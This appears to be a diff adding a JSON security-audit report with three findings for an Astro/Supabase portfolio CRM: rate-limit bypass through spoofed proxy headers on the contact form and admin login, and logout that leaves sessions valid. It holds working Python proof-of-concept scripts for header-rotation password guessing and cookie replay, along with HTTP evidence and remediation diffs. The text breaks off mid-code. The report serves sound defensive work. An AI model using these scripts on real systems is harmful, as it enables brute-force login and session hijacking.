@@ -1,0 +1,204 @@
+[
+  {
+    "id": "vuln-0001",
+    "title": "Rate-limit bypass in public contact endpoint via spoofed forwarding headers",
+    "severity": "medium",
+    "timestamp": "2026-08-26 13:44:54 UTC",
+    "description": "The public **`/api/contact`** endpoint derives its rate-limit key from client-supplied forwarding headers, allowing an unauthenticated attacker to evade the intended spam throttle by changing **`X-Forwarded-For`** or **`X-Real-IP`** values. This keeps attacker-controlled requests flowing into the service-role-backed contact ingestion path despite the presence of a limiter.",
+    "impact": "An unauthenticated attacker can bypass the contact form's anti-automation control and continue submitting arbitrary lead data into the CRM ingestion flow by rotating spoofed IP headers. This permits unauthorized manipulation of CRM records at scale and defeats the endpoint's intended abuse-prevention boundary, even though the downstream insert path is protected only by server-side service-role credentials.",
+    "target": "OrPiRa portfolio application",
+    "technical_analysis": "The contact ingestion route calls the limiter with **`getClientIp(request)`** before inserting into Supabase:\n\n```ts title=src/pages/api/contact.ts startLineNumber=95 endLineNumber=95\n\t\tif (isRateLimited(getClientIp(request))) {\n```\n\nThe shared helper used for this decision trusts attacker-controlled headers:\n\n```ts title=src/lib/rate-limit.ts startLineNumber=34 endLineNumber=53\nexport const getClientIp = (request: Request) => {\n\tconst realIp = request.headers.get(\"x-real-ip\")?.trim();\n\tif (realIp) {\n\t\treturn realIp;\n\t}\n\n\tconst forwarded = request.headers.get(\"x-forwarded-for\");\n\tif (forwarded) {\n\t\tconst candidates = forwarded\n\t\t\t.split(\",\")\n\t\t\t.map((value) => value.trim())\n\t\t\t.filter(Boolean);\n\n\t\tif (candidates.length > 0) {\n\t\t\treturn candidates[candidates.length - 1];\n\t\t}\n\t}\n\n\treturn \"unknown\";\n};\n```\n\nBecause the endpoint accepts these values directly from the request, the limiter key is attacker-chosen rather than server-derived. The result is a security decision based on untrusted input: once one spoofed address reaches the threshold, switching to a different header value immediately restores access to the pre-limit path. The route then continues into the service-role-backed **`supabase.from(\"contacts\").insert(...)`** operation.",
+    "poc_description": "1. Send repeated unauthenticated **`POST`** requests to **`/api/contact`** with a valid JSON body and a fixed spoofed **`X-Forwarded-For`** value.\n2. Observe that the first eight requests are processed normally and the ninth request returns **`429`**.\n3. Resend the same request immediately, changing only the spoofed forwarding header to a different IP value.\n4. Observe that the response returns to a non-**`429`** status, proving the limiter key is derived from attacker-controlled headers rather than a trusted server-side client address.\n5. Confirm that the non-**`429`** requests still reach the contact ingestion path, evidenced by downstream processing responses instead of rate-limit rejection.",
+    "poc_script_code": "```python\nimport json\nimport requests\n\nurl = \"http://127.0.0.1:4321/api/contact\"\npayload = {\n    \"name\": \"Test User\",\n    \"email\": \"test@example.com\",\n    \"message\": \"This is a validation message for rate limit behavior.\",\n    \"consent\": True,\n}\n\nheaders = {\n    \"Content-Type\": \"application/json\",\n}\n\nfor i in range(1, 10):\n    test_headers = headers | {\"X-Forwarded-For\": \"203.0.113.50\"}\n    response = requests.post(url, headers=test_headers, data=json.dumps(payload), timeout=10)\n    print(\"203.0.113.50\", i, response.status_code, response.text)\n\nfor spoofed_ip in [\"203.0.113.51\", \"203.0.113.52\"]:\n    test_headers = headers | {\"X-Forwarded-For\": spoofed_ip}\n    response = requests.post(url, headers=test_headers, data=json.dumps(payload), timeout=10)\n    print(spoofed_ip, response.status_code, response.text)\n```",
+    "remediation_steps": "1. Derive the rate-limit key from a server-trusted client address provided by the runtime or hosting platform, not from raw request headers.\n2. For Astro server routes, prefer the framework-provided client address value and fall back to a safe sentinel when it is unavailable.\n3. Treat **`X-Forwarded-For`** and **`X-Real-IP`** as untrusted unless they have been sanitized by a specifically trusted reverse proxy under application control.\n4. Apply the same rule consistently anywhere the shared IP helper is used for security decisions, including other throttled endpoints.",
+    "evidence": "Dynamic validation showed that one spoofed address hit the configured threshold and a new spoofed address immediately restored access:\n\n```http\nPOST /api/contact HTTP/1.1\nContent-Type: application/json\nX-Forwarded-For: 203.0.113.50\n```\n\n```text\n203.0.113.50 1 -> 500 {\"success\":false,\"error\":\"No se pudo procesar la solicitud.\"}\n203.0.113.50 2 -> 500 {\"success\":false,\"error\":\"No se pudo procesar la solicitud.\"}\n203.0.113.50 3 -> 500 {\"success\":false,\"error\":\"No se pudo procesar la solicitud.\"}\n203.0.113.50 4 -> 500 {\"success\":false,\"error\":\"No se pudo procesar la solicitud.\"}\n203.0.113.50 5 -> 500 {\"success\":false,\"error\":\"No se pudo procesar la solicitud.\"}\n203.0.113.50 6 -> 500 {\"success\":false,\"error\":\"No se pudo procesar la solicitud.\"}\n203.0.113.50 7 -> 500 {\"success\":false,\"error\":\"No se pudo procesar la solicitud.\"}\n203.0.113.50 8 -> 500 {\"success\":false,\"error\":\"No se pudo procesar la solicitud.\"}\n203.0.113.50 9 -> 429 {\"success\":false,\"error\":\"Demasiadas solicitudes. Intentalo de nuevo mas tarde.\"}\n203.0.113.51 -> 500 {\"success\":false,\"error\":\"No se pudo procesar la solicitud.\"}\n203.0.113.52 -> 500 {\"success\":false,\"error\":\"No se pudo procesar la solicitud.\"}\n```\n\nThe response transition from **`429`** back to non-**`429`** occurred solely by changing the attacker-supplied forwarding header. The downstream **`500`** responses came from the local Supabase insert environment, but they still prove the request passed the limiter and reached the service-role-backed processing path.\n\nSource evidence shows the vulnerable trust boundary:\n\n```ts title=src/lib/rate-limit.ts startLineNumber=35 endLineNumber=48\nconst realIp = request.headers.get(\"x-real-ip\")?.trim();\nif (realIp) {\n\treturn realIp;\n}\n\nconst forwarded = request.headers.get(\"x-forwarded-for\");\nif (forwarded) {\n\tconst candidates = forwarded\n\t\t.split(\",\")\n\t\t.map((value) => value.trim())\n\t\t.filter(Boolean);\n\n\tif (candidates.length > 0) {\n\t\treturn candidates[candidates.length - 1];\n\t}\n}\n```",
+    "assumptions": "Assumes the contact endpoint is publicly reachable and the runtime provides a trustworthy server-derived client address such as Astro's `clientAddress`. The demonstrated impact does not assume successful Supabase writes in the local environment; it is based on confirmed evasion of the limiter and continued access to the protected ingestion path.",
+    "fix_effort": "low",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "N",
+      "integrity": "L",
+      "availability": "N"
+    },
+    "endpoint": "/api/contact",
+    "method": "POST",
+    "cwe": "CWE-807",
+    "code_locations": [
+      {
+        "file": "src/lib/rate-limit.ts",
+        "start_line": 34,
+        "end_line": 53,
+        "snippet": "export const getClientIp = (request: Request) => {\n\tconst realIp = request.headers.get(\"x-real-ip\")?.trim();\n\tif (realIp) {\n\t\treturn realIp;\n\t}\n\n\tconst forwarded = request.headers.get(\"x-forwarded-for\");\n\tif (forwarded) {\n\t\tconst candidates = forwarded\n\t\t\t.split(\",\")\n\t\t\t.map((value) => value.trim())\n\t\t\t.filter(Boolean);\n\n\t\tif (candidates.length > 0) {\n\t\t\treturn candidates[candidates.length - 1];\n\t\t}\n\t}\n\n\treturn \"unknown\";\n};",
+        "label": "Untrusted header-based IP extraction used in a security decision"
+      },
+      {
+        "file": "src/pages/api/contact.ts",
+        "start_line": 3,
+        "end_line": 6,
+        "label": "Remove the spoofable IP helper import from the contact route",
+        "fix_before": "import type { APIRoute } from \"astro\";\nimport { randomUUID } from \"node:crypto\";\nimport { createClient } from \"@supabase/supabase-js\";\nimport { createRateLimiter, getClientIp } from \"../../lib/rate-limit\";",
+        "fix_after": "import type { APIRoute } from \"astro\";\nimport { randomUUID } from \"node:crypto\";\nimport { createClient } from \"@supabase/supabase-js\";\nimport { createRateLimiter } from \"../../lib/rate-limit\";"
+      },
+      {
+        "file": "src/pages/api/contact.ts",
+        "start_line": 50,
+        "end_line": 50,
+        "label": "Use Astro's trusted client address in the handler context",
+        "fix_before": "export const POST: APIRoute = async ({ request }) => {",
+        "fix_after": "export const POST: APIRoute = async ({ request, clientAddress }) => {"
+      },
+      {
+        "file": "src/pages/api/contact.ts",
+        "start_line": 95,
+        "end_line": 95,
+        "label": "Rate-limit on a server-derived address instead of client-controlled headers",
+        "fix_before": "\t\tif (isRateLimited(getClientIp(request))) {",
+        "fix_after": "\t\tif (isRateLimited(clientAddress ?? \"unknown\")) {"
+      }
+    ],
+    "fix_pr_body": "## Summary\n\nUse Astro's server-derived **`clientAddress`** for the public contact endpoint's rate-limit key instead of trusting raw **`X-Real-IP`** and **`X-Forwarded-For`** headers.\n\n## Rationale\n\nThe existing implementation lets the client choose the limiter key by supplying spoofed forwarding headers. Once one value reaches the threshold, an attacker can rotate the header and immediately regain access to the contact ingestion path. Switching this route to **`clientAddress`** binds the decision to a value derived by the runtime rather than untrusted request metadata.\n\n## Notes\n\nThe shared helper in `src/lib/rate-limit.ts` should not be used for security decisions unless its inputs are limited to a specifically trusted proxy chain. Review other throttled endpoints for the same pattern.",
+    "finding_class": "dynamic",
+    "agent_id": "d6b52180",
+    "agent_name": "Contact API Reporting Agent"
+  },
+  {
+    "id": "vuln-0002",
+    "title": "Authentication Rate-Limit Bypass in Dashboard Login via Spoofed Proxy Headers",
+    "severity": "medium",
+    "timestamp": "2026-08-26 13:49:38 UTC",
+    "description": "The dashboard login endpoint derives its rate-limit key from client-supplied proxy headers, allowing an unauthenticated attacker to rotate `x-real-ip` values and bypass the login throttle. This removes the intended online guessing protection on the administrative login.",
+    "impact": "An unauthenticated attacker can make unlimited password attempts against `POST /dashboard/login` by changing spoofed proxy IP headers between requests. This bypasses the only demonstrated brute-force protection on the administrative login and materially weakens the protection of the dashboard session boundary.",
+    "target": "/workspace/OrPiRa-portfolio",
+    "technical_analysis": "The dashboard login route enforces throttling before password verification:\n\n```ts title=src/pages/dashboard/login.ts startLineNumber=30 endLineNumber=43\nexport const POST: APIRoute = async ({\n  request,\n  cookies,\n  redirect\n}) => {\n\n  const form =\n    await request.formData();\n\n  const password =\n    form.get(\"password\");\n\n  if (isRateLimited(getClientIp(request))) {\n    return redirect(\"/dashboard?error=2\", 303);\n  }\n```\n\nThe rate-limit key comes from `getClientIp(request)`, which trusts `x-real-ip` first and then `x-forwarded-for`:\n\n```ts title=src/lib/rate-limit.ts startLineNumber=34 endLineNumber=52\nexport const getClientIp = (request: Request) => {\n\tconst realIp = request.headers.get(\"x-real-ip\")?.trim();\n\tif (realIp) {\n\t\treturn realIp;\n\t}\n\n\tconst forwarded = request.headers.get(\"x-forwarded-for\");\n\tif (forwarded) {\n\t\tconst candidates = forwarded\n\t\t\t.split(\",\")\n\t\t\t.map((value) => value.trim())\n\t\t\t.filter(Boolean);\n\n\t\tif (candidates.length > 0) {\n\t\t\treturn candidates[candidates.length - 1];\n\t\t}\n\t}\n\n\treturn \"unknown\";\n};\n```\n\nBecause these headers are accepted directly from the request, the client controls the limiter key. Reusing one spoofed `x-real-ip` value triggers the limit after five failures, but rotating spoofed values yields a fresh bucket each time and keeps the endpoint in the normal invalid-password path. A local verification patch that bound the limiter to Astro's server-provided `clientAddress` caused the sixth rotated request to return the rate-limit response, confirming the root cause and remediation.",
+    "poc_description": "1. Send six same-origin `POST` requests to `http://127.0.0.1:4321/dashboard/login` with an invalid password and the same spoofed `x-real-ip` header value.\n2. Observe that attempts `1` through `5` redirect to `/dashboard?error=1`, while attempt `6` redirects to `/dashboard?error=2`.\n3. Repeat the test with a fresh series of invalid login attempts, but change the spoofed `x-real-ip` value on every request.\n4. Observe that each rotated request redirects to `/dashboard?error=1` instead of reaching `/dashboard?error=2`.\n5. Apply the fix that uses Astro's server-side `clientAddress` for the rate-limit key.\n6. Repeat the rotated-header sequence and observe that the sixth request is again redirected to `/dashboard?error=2`, showing that header rotation no longer bypasses the throttle.",
+    "poc_script_code": "```python\nimport requests\n\nurl = \"http://127.0.0.1:4321/dashboard/login\"\nbase_headers = {\n    \"Origin\": \"http://127.0.0.1:4321\",\n    \"Referer\": \"http://127.0.0.1:4321/dashboard\",\n    \"Content-Type\": \"application/x-www-form-urlencoded\",\n}\n\ndef attempt(spoofed_ip: str) -> str:\n    response = requests.post(\n        url,\n        headers={**base_headers, \"x-real-ip\": spoofed_ip},\n        data={\"password\": \"wrongpass\"},\n        allow_redirects=False,\n        timeout=10,\n    )\n    return response.headers.get(\"Location\", \"\")\n\nprint(\"Same spoofed IP\")\nfor index in range(1, 7):\n    print(index, attempt(\"203.0.113.90\"))\n\nprint(\"Rotating spoofed IPs\")\nfor spoofed_ip in [\n    \"203.0.113.100\",\n    \"203.0.113.101\",\n    \"203.0.113.102\",\n    \"203.0.113.103\",\n    \"203.0.113.104\",\n    \"203.0.113.105\",\n]:\n    print(spoofed_ip, attempt(spoofed_ip))\n```",
+    "remediation_steps": "1. Derive the dashboard login rate-limit key from a server-controlled client address, such as Astro's `clientAddress`, instead of directly trusting `x-real-ip` or `x-forwarded-for` from the request.\n2. Keep proxy-header parsing behind an explicit trusted-proxy boundary if those headers must be used elsewhere.\n3. Re-test the login flow to ensure that repeated failed attempts from the same client are throttled even when proxy headers are rotated.\n4. Review other uses of the shared rate-limit helper and update them to use the same server-controlled client identity source where appropriate.",
+    "evidence": "Repeated failed logins with one spoofed header value hit the throttle on the sixth request:\n\n```text\nSame spoofed IP attempts\n1 /dashboard?error=1\n2 /dashboard?error=1\n3 /dashboard?error=1\n4 /dashboard?error=1\n5 /dashboard?error=1\n6 /dashboard?error=2\n```\n\nRotating only the client-supplied `x-real-ip` header bypassed the throttle and preserved the normal invalid-password response:\n\n```text\nRotating spoofed IP attempts\n203.0.113.100 /dashboard?error=1\n203.0.113.101 /dashboard?error=1\n203.0.113.102 /dashboard?error=1\n203.0.113.103 /dashboard?error=1\n203.0.113.104 /dashboard?error=1\n203.0.113.105 /dashboard?error=1\n```\n\nAfter a local remediation that keyed the limiter to Astro's server-provided `clientAddress`, the same rotated-header sequence was throttled on the sixth request:\n\n```text\nRotating spoofed x-real-ip after patch\n203.0.113.110 /dashboard?error=1\n203.0.113.111 /dashboard?error=1\n203.0.113.112 /dashboard?error=1\n203.0.113.113 /dashboard?error=1\n203.0.113.114 /dashboard?error=1\n203.0.113.115 /dashboard?error=2\n```",
+    "assumptions": "Assumes the attacker can send unauthenticated requests directly to the dashboard login endpoint and supply arbitrary HTTP headers, which was true for the validated local deployment.",
+    "fix_effort": "low",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "N",
+      "integrity": "L",
+      "availability": "N"
+    },
+    "endpoint": "/dashboard/login",
+    "method": "POST",
+    "cwe": "CWE-307",
+    "code_locations": [
+      {
+        "file": "src/pages/dashboard/login.ts",
+        "start_line": 30,
+        "end_line": 43,
+        "snippet": "export const POST: APIRoute = async ({\n  request,\n  cookies,\n  redirect\n}) => {\n\n  const form =\n    await request.formData();\n\n  const password =\n    form.get(\"password\");\n\n  if (isRateLimited(getClientIp(request))) {\n    return redirect(\"/dashboard?error=2\", 303);\n  }",
+        "label": "Use server-controlled client address for the dashboard login limiter",
+        "fix_before": "export const POST: APIRoute = async ({\n  request,\n  cookies,\n  redirect\n}) => {\n\n  const form =\n    await request.formData();\n\n  const password =\n    form.get(\"password\");\n\n  if (isRateLimited(getClientIp(request))) {\n    return redirect(\"/dashboard?error=2\", 303);\n  }",
+        "fix_after": "export const POST: APIRoute = async ({\n  request,\n  clientAddress,\n  cookies,\n  redirect\n}) => {\n\n  const form =\n    await request.formData();\n\n  const password =\n    form.get(\"password\");\n\n  if (isRateLimited(getClientIp(request, clientAddress))) {\n    return redirect(\"/dashboard?error=2\", 303);\n  }"
+      },
+      {
+        "file": "src/lib/rate-limit.ts",
+        "start_line": 34,
+        "end_line": 52,
+        "snippet": "export const getClientIp = (request: Request) => {\n\tconst realIp = request.headers.get(\"x-real-ip\")?.trim();\n\tif (realIp) {\n\t\treturn realIp;\n\t}\n\n\tconst forwarded = request.headers.get(\"x-forwarded-for\");\n\tif (forwarded) {\n\t\tconst candidates = forwarded\n\t\t\t.split(\",\")\n\t\t\t.map((value) => value.trim())\n\t\t\t.filter(Boolean);\n\n\t\tif (candidates.length > 0) {\n\t\t\treturn candidates[candidates.length - 1];\n\t\t}\n\t}\n\n\treturn \"unknown\";\n};",
+        "label": "Prefer Astro's server-side client address over client-supplied proxy headers",
+        "fix_before": "export const getClientIp = (request: Request) => {\n\tconst realIp = request.headers.get(\"x-real-ip\")?.trim();\n\tif (realIp) {\n\t\treturn realIp;\n\t}\n\n\tconst forwarded = request.headers.get(\"x-forwarded-for\");\n\tif (forwarded) {\n\t\tconst candidates = forwarded\n\t\t\t.split(\",\")\n\t\t\t.map((value) => value.trim())\n\t\t\t.filter(Boolean);\n\n\t\tif (candidates.length > 0) {\n\t\t\treturn candidates[candidates.length - 1];\n\t\t}\n\t}\n\n\treturn \"unknown\";\n};",
+        "fix_after": "export const getClientIp = (\n\trequest: Request,\n\tclientAddress?: string | null,\n) => {\n\tconst normalizedClientAddress = clientAddress?.trim();\n\tif (normalizedClientAddress) {\n\t\treturn normalizedClientAddress;\n\t}\n\n\tconst realIp = request.headers.get(\"x-real-ip\")?.trim();\n\tif (realIp) {\n\t\treturn realIp;\n\t}\n\n\tconst forwarded = request.headers.get(\"x-forwarded-for\");\n\tif (forwarded) {\n\t\tconst candidates = forwarded\n\t\t\t.split(\",\")\n\t\t\t.map((value) => value.trim())\n\t\t\t.filter(Boolean);\n\n\t\tif (candidates.length > 0) {\n\t\t\treturn candidates[candidates.length - 1];\n\t\t}\n\t}\n\n\treturn \"unknown\";\n};"
+      }
+    ],
+    "fix_pr_body": "## Summary\n\nBind the dashboard login rate-limit key to Astro's server-provided `clientAddress` instead of allowing client-supplied proxy headers to define the limiter bucket.\n\n## Rationale\n\nThe current implementation lets an unauthenticated client rotate `x-real-ip` or `x-forwarded-for` values and obtain a fresh rate-limit bucket on every request. Passing `clientAddress` from the route handler restores a server-controlled identity source for the administrative login while keeping the helper backward-compatible for other callers that have not yet been migrated.",
+    "finding_class": "dynamic",
+    "agent_id": "747d6c45",
+    "agent_name": "Dashboard Rate Limit Reporting Agent"
+  },
+  {
+    "id": "vuln-0003",
+    "title": "Logout Does Not Invalidate Existing Dashboard Sessions",
+    "severity": "low",
+    "timestamp": "2026-08-26 13:50:50 UTC",
+    "description": "The dashboard logout flow deletes the browser cookie but does not invalidate the underlying administrator session. A previously copied `crm_session` token remains valid after logout and continues to grant access to protected CRM pages until the cookie expires.",
+    "impact": "An attacker who has obtained a valid `crm_session` cookie can continue accessing protected dashboard content after the legitimate user logs out. The demonstrated impact is continued unauthorized read access to CRM lead data exposed through `/dashboard/leads` and related protected dashboard routes until the session naturally expires.",
+    "target": "http://127.0.0.1:4321",
+    "technical_analysis": "The dashboard session model is fully stateless. `src/lib/admin-session.ts` creates a token as `expiresAt.nonce.signature` and `verifyAdminSession()` only checks the HMAC and expiration timestamp:\n\n```typescript title=src/lib/admin-session.ts startLineNumber=19 endLineNumber=39\nexport const createAdminSession = () => {\n\tconst expiresAt = Math.floor(Date.now() / 1000) + ADMIN_SESSION_MAX_AGE;\n\tconst payload = `${expiresAt}.${randomBytes(24).toString(\"base64url\")}`;\n\n\treturn `${payload}.${sign(payload)}`;\n};\n\nexport const verifyAdminSession = (token?: string) => {\n\tif (!token) return false;\n\n\tconst parts = token.split(\".\");\n\tif (parts.length !== 3) return false;\n\n\tconst [expiresAt, nonce, signature] = parts;\n\tif (!/^\\d+$/.test(expiresAt) || !nonce || !signature) return false;\n\tif (Number(expiresAt) <= Math.floor(Date.now() / 1000)) return false;\n\n\tconst expected = Buffer.from(sign(`${expiresAt}.${nonce}`));\n\tconst received = Buffer.from(signature);\n\n\treturn expected.length === received.length && timingSafeEqual(expected, received);\n};\n```\n\n`src/pages/dashboard/logout.ts` only deletes the client cookie and never records revocation state:\n\n```typescript title=src/pages/dashboard/logout.ts startLineNumber=9 endLineNumber=16\ncookies.delete(\n  ADMIN_SESSION_COOKIE,\n  {\n    path: \"/dashboard\"\n  }\n);\n\nreturn redirect(\"/dashboard\", 303);\n```\n\n`src/middleware.ts` then continues to accept any copied token whose signature and expiration remain valid:\n\n```typescript title=src/middleware.ts startLineNumber=51 endLineNumber=55\nif (\n\tisDashboardRoute &&\n\t!PUBLIC_DASHBOARD_PATHS.has(pathname) &&\n\t!verifyAdminSession(context.cookies.get(ADMIN_SESSION_COOKIE)?.value)\n) {\n```\n\nBecause there is no server-side session registry or revocation check, logout is only a local browser cleanup action. Any previously copied cookie remains replayable until `ADMIN_SESSION_MAX_AGE` elapses.",
+    "poc_description": "1. Authenticate to `/dashboard` with a valid administrator password and capture the issued `crm_session` cookie.\n2. Copy the cookie value aside before logging out.\n3. Request `/dashboard/leads` with the live cookie and confirm the protected page is accessible.\n4. Submit `POST /dashboard/logout` and observe that the active browser jar is cleared.\n5. Replay the copied pre-logout `crm_session` value in a fresh request to `/dashboard/leads`.\n6. Observe that the protected dashboard still returns `200 OK`, proving logout did not invalidate the issued session.",
+    "poc_script_code": "```python\nimport requests\n\nBASE = \"http://127.0.0.1:4321\"\nPASSWORD = \"<ADMIN_PASSWORD>\"\nCLIENT_IP = \"203.0.113.201\"\n\nsession = requests.Session()\nlogin_headers = {\n    \"Origin\": BASE,\n    \"Referer\": f\"{BASE}/dashboard\",\n    \"X-Real-IP\": CLIENT_IP,\n}\n\nlogin = session.post(\n    f\"{BASE}/dashboard/login\",\n    data={\"password\": PASSWORD},\n    headers=login_headers,\n    allow_redirects=False,\n)\nlogin.raise_for_status()\n\ncopied_cookie = session.cookies.get(\"crm_session\")\nassert copied_cookie, \"No admin session cookie was issued\"\n\nbefore_logout = session.get(f\"{BASE}/dashboard/leads\", allow_redirects=False)\nprint(\"before_logout_status=\", before_logout.status_code)\n\nlogout = session.post(\n    f\"{BASE}/dashboard/logout\",\n    headers={\n        \"Origin\": BASE,\n        \"Referer\": f\"{BASE}/dashboard/leads\",\n    },\n    allow_redirects=False,\n)\nprint(\"logout_status=\", logout.status_code)\nprint(\"logout_set_cookie=\", logout.headers.get(\"Set-Cookie\"))\n\nreplay = requests.get(\n    f\"{BASE}/dashboard/leads\",\n    headers={\"Cookie\": f\"crm_session={copied_cookie}\"},\n    allow_redirects=False,\n)\nprint(\"replay_status=\", replay.status_code)\n```",
+    "remediation_steps": "1. Replace the stateless dashboard cookie with a session model that has server-side revocation state.\n2. Register each issued session in a server-side store, keyed by a session identifier carried in the signed cookie.\n3. On logout, revoke that server-side record before deleting the browser cookie.\n4. In middleware, require both a valid signature and an active, non-revoked server-side session record before granting access to `/dashboard/*`.\n5. Fail closed when the session registry cannot be queried, and periodically purge expired session records.",
+    "evidence": "A validated local run showed the following sequence:\n\n```http\nPOST /dashboard/login HTTP/1.1\nHost: 127.0.0.1:4321\nOrigin: http://127.0.0.1:4321\nReferer: http://127.0.0.1:4321/dashboard\nX-Real-IP: 203.0.113.201\nContent-Type: application/x-www-form-urlencoded\n\npassword=<redacted>\n```\n\n```http\nHTTP/1.1 303 See Other\nLocation: /dashboard/leads\nSet-Cookie: crm_session=1787780573.35nP6gnAEltO-RPdgFnSby4kzTK9kfFr.cWTMquRwCOeS-E76HNzmbDKuJQZ2h754k1fyR7aO9Do; Path=/dashboard; HttpOnly; SameSite=Strict\n```\n\nUsing that cookie against the protected dashboard returned success:\n\n```http\nGET /dashboard/leads HTTP/1.1\nHost: 127.0.0.1:4321\nCookie: crm_session=1787780573.35nP6gnAEltO-RPdgFnSby4kzTK9kfFr.cWTMquRwCOeS-E76HNzmbDKuJQZ2h754k1fyR7aO9Do\n```\n\n```http\nHTTP/1.1 200 OK\n```\n\nAfter logout, the active browser jar was cleared:\n\n```http\nPOST /dashboard/logout HTTP/1.1\nHost: 127.0.0.1:4321\nCookie: crm_session=1787780573.35nP6gnAEltO-RPdgFnSby4kzTK9kfFr.cWTMquRwCOeS-E76HNzmbDKuJQZ2h754k1fyR7aO9Do\n```\n\n```http\nHTTP/1.1 303 See Other\nLocation: /dashboard\nSet-Cookie: crm_session=deleted; Path=/dashboard; Max-Age=0\n```\n\nReplaying the copied pre-logout cookie still granted access:\n\n```http\nGET /dashboard/leads HTTP/1.1\nHost: 127.0.0.1:4321\nCookie: crm_session=1787780573.35nP6gnAEltO-RPdgFnSby4kzTK9kfFr.cWTMquRwCOeS-E76HNzmbDKuJQZ2h754k1fyR7aO9Do\n```\n\n```http\nHTTP/1.1 200 OK\n```",
+    "assumptions": "Assumes the attacker has already obtained a valid `crm_session` cookie before the legitimate user logs out. This finding does not claim a separate path to steal that cookie.",
+    "fix_effort": "medium",
+    "cvss": 3.7,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "H",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "L",
+      "integrity": "N",
+      "availability": "N"
+    },
+    "endpoint": "/dashboard/logout",
+    "method": "POST",
+    "cwe": "CWE-613",
+    "code_locations": [
+      {
+        "file": "src/lib/admin-session.ts",
+        "start_line": 1,
+        "end_line": 40,
+        "snippet": "import { createHmac, randomBytes, timingSafeEqual } from \"node:crypto\";\n\nexport const ADMIN_SESSION_COOKIE = \"crm_session\";\nexport const ADMIN_SESSION_MAX_AGE = 60 * 60 * 8;\n\nconst getSessionSecret = () => {\n\tconst secret = import.meta.env.ADMIN_SESSION_SECRET;\n\n\tif (!secret || secret.length < 32) {\n\t\tthrow new Error(\"ADMIN_SESSION_SECRET debe tener al menos 32 caracteres\");\n\t}\n\n\treturn secret;\n};\n\nconst sign = (value: string) =>\n\tcreateHmac(\"sha256\", getSessionSecret()).update(value).digest(\"base64url\");\n\nexport const createAdminSession = () => {\n\tconst expiresAt = Math.floor(Date.now() / 1000) + ADMIN_SESSION_MAX_AGE;\n\tconst payload = `${expiresAt}.${randomBytes(24).toString(\"base64url\")}`;\n\n\treturn `${payload}.${sign(payload)}`;\n};\n\nexport const verifyAdminSession = (token?: string) => {\n\tif (!token) return false;\n\n\tconst parts = token.split(\".\");\n\tif (parts.length !== 3) return false;\n\n\tconst [expiresAt, nonce, signature] = parts;\n\tif (!/^\\d+$/.test(expiresAt) || !nonce || !signature) return false;\n\tif (Number(expiresAt) <= Math.floor(Date.now() / 1000)) return false;\n\n\tconst expected = Buffer.from(sign(`${expiresAt}.${nonce}`));\n\tconst received = Buffer.from(signature);\n\n\treturn expected.length === received.length && timingSafeEqual(expected, received);\n};",
+        "label": "Add server-side session registration and revocation checks",
+        "fix_before": "import { createHmac, randomBytes, timingSafeEqual } from \"node:crypto\";\n\nexport const ADMIN_SESSION_COOKIE = \"crm_session\";\nexport const ADMIN_SESSION_MAX_AGE = 60 * 60 * 8;\n\nconst getSessionSecret = () => {\n\tconst secret = import.meta.env.ADMIN_SESSION_SECRET;\n\n\tif (!secret || secret.length < 32) {\n\t\tthrow new Error(\"ADMIN_SESSION_SECRET debe tener al menos 32 caracteres\");\n\t}\n\n\treturn secret;\n};\n\nconst sign = (value: string) =>\n\tcreateHmac(\"sha256\", getSessionSecret()).update(value).digest(\"base64url\");\n\nexport const createAdminSession = () => {\n\tconst expiresAt = Math.floor(Date.now() / 1000) + ADMIN_SESSION_MAX_AGE;\n\tconst payload = `${expiresAt}.${randomBytes(24).toString(\"base64url\")}`;\n\n\treturn `${payload}.${sign(payload)}`;\n};\n\nexport const verifyAdminSession = (token?: string) => {\n\tif (!token) return false;\n\n\tconst parts = token.split(\".\");\n\tif (parts.length !== 3) return false;\n\n\tconst [expiresAt, nonce, signature] = parts;\n\tif (!/^\\d+$/.test(expiresAt) || !nonce || !signature) return false;\n\tif (Number(expiresAt) <= Math.floor(Date.now() / 1000)) return false;\n\n\tconst expected = Buffer.from(sign(`${expiresAt}.${nonce}`));\n\tconst received = Buffer.from(signature);\n\n\treturn expected.length === received.length && timingSafeEqual(expected, received);\n};",
+        "fix_after": "import { createHmac, randomBytes, timingSafeEqual } from \"node:crypto\";\nimport { supabaseAdmin } from \"./supabase-admin\";\n\nexport const ADMIN_SESSION_COOKIE = \"crm_session\";\nexport const ADMIN_SESSION_MAX_AGE = 60 * 60 * 8;\n\nconst ADMIN_SESSION_TABLE = \"admin_sessions\";\n\nconst getSessionSecret = () => {\n\tconst secret = import.meta.env.ADMIN_SESSION_SECRET;\n\n\tif (!secret || secret.length < 32) {\n\t\tthrow new Error(\"ADMIN_SESSION_SECRET debe tener al menos 32 caracteres\");\n\t}\n\n\treturn secret;\n};\n\nconst sign = (value: string) =>\n\tcreateHmac(\"sha256\", getSessionSecret()).update(value).digest(\"base64url\");\n\nconst parseAdminSession = (token?: string) => {\n\tif (!token) return null;\n\n\tconst parts = token.split(\".\");\n\tif (parts.length !== 3) return null;\n\n\tconst [expiresAt, sessionId, signature] = parts;\n\tif (!/^\\d+$/.test(expiresAt) || !sessionId || !signature) return null;\n\n\tconst expiresAtNumber = Number(expiresAt);\n\tif (expiresAtNumber <= Math.floor(Date.now() / 1000)) return null;\n\n\tconst payload = `${expiresAt}.${sessionId}`;\n\tconst expected = Buffer.from(sign(payload));\n\tconst received = Buffer.from(signature);\n\n\tif (expected.length !== received.length || !timingSafeEqual(expected, received)) {\n\t\treturn null;\n\t}\n\n\treturn {\n\t\texpiresAt: expiresAtNumber,\n\t\tsessionId,\n\t\ttoken: `${payload}.${signature}`,\n\t};\n};\n\nexport const createAdminSession = async () => {\n\tconst expiresAt = Math.floor(Date.now() / 1000) + ADMIN_SESSION_MAX_AGE;\n\tconst sessionId = randomBytes(24).toString(\"base64url\");\n\tconst payload = `${expiresAt}.${sessionId}`;\n\tconst token = `${payload}.${sign(payload)}`;\n\n\tconst { error } = await supabaseAdmin.from(ADMIN_SESSION_TABLE).insert({\n\t\tsession_id: sessionId,\n\t\texpires_at: new Date(expiresAt * 